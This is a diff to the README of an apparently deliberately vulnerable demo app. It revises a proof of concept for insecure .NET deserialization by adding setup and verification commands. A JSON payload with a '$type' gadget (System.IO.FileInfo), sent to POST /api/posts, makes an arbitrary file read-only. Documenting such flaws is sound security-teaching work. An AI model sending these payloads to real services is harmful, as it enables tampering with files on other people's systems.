@@ -10,16 +10,20 @@ This app currently contains two known vulnerabilities:
 Call the `POST /api/posts` endpoint with the following payloads.
 
 ## Exploit POC
-(Note: I could not get this to work myself)
+
+First run `touch /tmp/rce-test.txt && chmod 777 /tmp/rce-test.txt`. Then send the following payload to the API:
+
 ```
 {
     "input": {
         "$type":"System.IO.FileInfo, System.IO.FileSystem",
-        "fileName":"rce-test.txt",
+        "fileName":"/tmp/rce-test.txt",
         "IsReadOnly": true
     }
 }
 ```
+
+Then run `ls -l /tmp/rce-test.txt` and you should see that the file is now read-only.
 
 ## Valid data
 ```
